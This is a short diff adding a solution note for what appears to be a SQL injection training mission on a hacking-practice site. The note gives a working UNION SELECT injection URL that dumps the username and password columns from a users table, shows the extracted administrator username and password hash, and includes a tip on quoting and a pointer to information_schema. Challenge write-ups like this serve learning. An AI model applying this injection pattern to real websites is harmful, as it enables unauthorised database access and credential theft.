@@ -1,0 +1,11 @@
+This was the url I used to get the username and password
+
+http://www.enigmagroup.org/missions/basics/sql/2/index.php?id=null%20UNION%20SELECT%201,password,username%20FROM%20`users`
+
+password: 6537d34fd1c080b5cb7f06dde3a26fe8
+username: administrator
+
+Make sure to use ` and not '
+
+
+information_schema
